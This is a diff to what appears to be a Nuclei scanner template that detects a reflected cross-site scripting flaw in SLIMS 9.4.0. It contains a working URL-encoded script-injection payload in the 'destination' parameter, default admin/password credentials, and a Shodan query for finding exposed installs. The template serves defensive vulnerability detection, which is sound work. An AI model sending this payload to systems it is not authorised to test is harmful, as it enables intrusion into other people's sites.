@@ -1,7 +1,7 @@
 id: slims-xss
 
 info:
-  name: Senayan Library Management System v9.4.0 a.k.a SLIMS 9 - Access Control
+  name: Senayan Library Management System v9.4.0(SLIMS 9) - Cross Site Scripting
   author: arafatansari
   severity: medium
   description: |
@@ -9,22 +9,28 @@ info:
   reference:
     - https://packetstormsecurity.com/files/170182/Senayan-Library-Management-System-9.4.0-Cross-Site-Scripting.html
   metadata:
-    shodan-query: http.html:"SLIMS"
     verified: "true"
-  tags: xss,slims
+    shodan-query: http.html:"SLIMS"
+  tags: xss,slims,senayan
 
 requests:
-  - raw:
-      - |
-        GET /index.php?p=member&destination=zbuip%22%3e%3cscript%3ealert(1)%3c%2fscript%3ejgoihbmmygl&memberID=admin&memberPassWord=password&_csrf_token_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&logMeIn=Login HTTP/1.1
-        Host: {{Hostname}}
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?_csrf_token_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&destination=zbuip%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ejgoihbmmygljgoihbmmygl&logMeIn=Login&memberID=admin&memberPassWord=password&p=member"
 
     matchers-condition: and
     matchers:
+      - type: word
+        words:
+          - '<script>alert(document.domain)</script>'
+          - 'SLiMS'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
       - type: status
         status:
           - 200
-
-      - type: word
-        words:
-          - '<script>alert(1)</script>'
